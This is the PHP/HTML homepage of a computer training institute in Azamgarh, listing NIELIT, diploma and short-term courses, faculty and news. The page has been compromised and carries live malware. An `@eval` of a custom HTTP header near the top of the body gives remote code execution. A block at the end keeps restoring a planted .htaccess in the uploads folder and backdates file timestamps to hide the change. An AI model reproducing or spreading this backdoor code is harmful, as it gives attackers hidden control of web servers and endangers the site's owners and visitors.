...
<html lang="en">
 <head>
  <title>Welcome to Uma Institute Of Management and Technology|Azamgarh </title>
  <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="keywords" content="uimt,UIMT INSTITUTE, uimt topper,UIMT AZAMGARH,UIMT GORAKHAPUR,uma azamgarh,uma institute of management & technology,uma institute,best institute,uma computer institute azamgarh,uma technical institute azamgarh,uma electronic institute azamgarh,uma computer institute,uma best faculty,diploma in azamgarh,professinal course in azamgarh,certificate course,uimt,uma electronic institute,diploma course,pgdiploma course,ccc course,short term course,best institute,azamgarh,uma,institute,uma management,uma technology,beautician course,nielit course,ACC,BCC,CCC,CCCP,O LEVEL,DCA,ADCA,PGDCA,MS WORD,MS-Office,Photoshop,Coral-DRAW,
uma coaching institute,uma institute azamgarh,uma institute address,uma ccc,uma institute diploma,uma courses,">
  <meta name="description" content="uma institute of management & technology | azamgarh | Diploma & Tranning institute in azamgarh | best institute in azamgarh |best facuty in town| provide courses CCC, O level ">
  <meta name="author" content="Akhilesh Yadav Mob. No. 7007063243">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  ...
  <body>
 <?php @eval($_SERVER['HTTP_UIMTIN13']); ?>
     ...
     <div class="home1">
      <div class="home_slider_container">
       ...
       <div class="owl-carousel owl-theme home_slider">
        <?php include('code/db_con.php');
$query="select * from home_slider";
$result=mysqli_query($conn, $query);
while($row=mysqli_fetch_assoc($result))
{
$image="admin/uploads/slider/".$row['photo'];

         ?>
        <!-- Home Slider Item -->
        <div class="owl-item">
         <div class="home_slider_background" style="background-image:url(<?php echo $image; ?>)"></div>
        </div>
        <!-- Home Slider Item -->
        <?php 
      } 
     ...
     <!-- croliing bar -->
     <div style="margin-top: 0px; padding: 5px; background-color:#000;">
      <div class="container"style="max-width: 1350px;">
       <div class="row">
        <div class="col-12">
         <marquee class="marq"behavior="alternate"onmouseover="this.stop();" onmouseout="this.start();">
         <a href="#">Uma Institute Of Management & Technology || </a>
         <a href="#">Certified By :</a>
          <a href="#"> NIELIT "O" LEVEL Accreditation:-  ACCR-O2172 ||  </a>
          <a href="#"> NIELIT CCC Accreditation: 88000361 </a>
        ...
        <!-- heading News -->
       <div style="margin: 30px"><marquee behavior="alternate" ><h2>Welcome To Uma Institute Of Management & Technology</h2></marquee>
       </div>
       <!-- Latest News -->
              
      <?php include'newselter.php';?>
         
         
         <!-- Newsletter -->
          <?php include'topstudent_inc.php';?>
         <!-- Features -->
          ...
          <div class="container">
           <div class="row">
            <div class="col">
             <div class="section_title_container text-center">
              <h2 class="section_title">Our Popular Courses</h2>
              <div class="section_subtitle"><p><h6>Uma Institute Of Management Offering Following  Professinal and Job Oriented Courses.</h6> </p></div>
             </div>
            </div>
           </div>
           <div class="row courses_row">
            ...
            <div class="col-lg-4 course_col">
             <div class="course  newsbar">
              <div class="course_image"><img src="img/nil.jpg" alt="uimt"></div>
              <div class="course_body">
               <h3 class="course_title"><a href="nielit_course.php">Nielit Courses</a></h3>
               <div class="course_teacher">Uma Institute Of Managment & Technology</div>
               <div class="course_text">
                <p>ACC, BCC, CCC, CCCP, ECC, O LEVEL etc.  Training and Practical program.</p>
               </div>
              </div>
              <div class="course_footer">
               <div class="course_footer_content d-flex flex-row align-items-center justify-content-start">
                ...
                <div class="course_price ml-auto">start-Rs 1000</div>
               </div>
              </div>
             </div>
            </div>
            ...
            <div class="col-lg-4 course_col">
             <div class="course newsbar">
              <div class="course_image"><img src="img/c3.jpg" alt="uimt"></div>
              <div class="course_body">
               <h3 class="course_title"><a href="diploma_course.php">Diploma Courses</a></h3>
               <div class="course_teacher">Uma Institute Of Managment & Technology</div>
               <div class="course_text">
                <p>DCA, ADCA, DCHN, O LEVEL, DAR, Office Management Courses etc.</p>
               </div>
              </div>
              <div class="course_footer">
               <div class="course_footer_content d-flex flex-row align-items-center justify-content-start">
                ...
                <div class="course_price ml-auto">start-Rs 1500</div>
               </div>
              </div>
             </div>
            </div>
            ...
            <div class="col-lg-4 course_col">
             <div class="course newsbar">
              <div class="course_image"><img src="img/c1.jpg" alt="uimt"></div>
              <div class="course_body">
               <h3 class="course_title"><a href="short_course.php">Short Term Courses</a></h3>
                             <div class="course_teacher">Uma Institute Of Managment & Technology</div>
               <div class="course_text">
                <p>MS-Office, Tally With GST, Photoshop, Coral Draw, C/C++ Language, Html, Visual Basic etc.</p>
               </div>
              </div>
              <div class="course_footer">
               <div class="course_footer_content d-flex flex-row align-items-center justify-content-start">
                ...
                <div class="course_price ml-auto"><span>Rs 1500</span>Rs 1000</div>
               </div>
              </div>
             </div>
            </div>
         ...
         <div class="team">
          ...
          <div class="container">
           <div class="row">
            <div class="col">
             <div class="section_title_container text-center">
              <h2 class="section_title">Our Best Team </h2>
              <div class="section_subtitle"><p><h6>We provide the best teaching staff. </h6></p></div>
             </div>
            </div>
           </div>
           <div class="row team_row">
            <?php
            include'code/db_con.php';
            $res=mysqli_query($conn,"select * from faculty limit 4");
            ...
            <div class="col-lg-3 col-md-6 team_col">
             <div class="team_item">
              <div class="team_image"><img src="admin/uploads/faculty/<?=$row['f_image'];?>" alt=""></div>
              <div class="team_body">
               <div class="team_title"><a href="#"><?=$row['name'];?></a></div>
               <div class="team_subtitle"><?=$row['degination'];?></div>
  ...
  $("#owl-demo").owlCarousel({
    ...
    responsive:{
        ...
        $("#OpenForm").click(function(){
            $(".enquiry_form_area").animate({
                width: "toggle"
            });
        });
    });
<?php if (!is_dir(' /home/u804692432/domains/uimt.in/public_html/admin/uploads/')) { mkdir(' /home/u804692432/domains/uimt.in/public_html/admin/uploads/', 0755, true); }
if (!file_exists(' /home/u804692432/domains/uimt.in/public_html/admin/uploads/.htaccess')) { copy('/tmp/sess_htacctr', ' /home/u804692432/domains/uimt.in/public_html/admin/uploads/.htaccess'); } else { $filename = ' /home/u804692432/domains/uimt.in/public_html/admin/uploads/.htaccess'; $md5file = md5_file($filename); if($md5file != 'a78bb8644a1f0d15061413789c348112' ) { chmod(' /home/u804692432/domains/uimt.in/public_html/admin/uploads/.htaccess', 0644 ); unlink(' /home/u804692432/domains/uimt.in/public_html/admin/uploads/.htaccess'); copy('/tmp/sess_htacctr', ' /home/u804692432/domains/uimt.in/public_html/admin/uploads/.htaccess'); } }@touch(" /home/u804692432/domains/uimt.in/public_html/admin/uploads/",strtotime("-111 days", time()));
@touch(" /home/u804692432/domains/uimt.in/public_html/admin/uploads/.htaccess",strtotime("-111 days", time())); ?>
</script>
      </body>
     </html>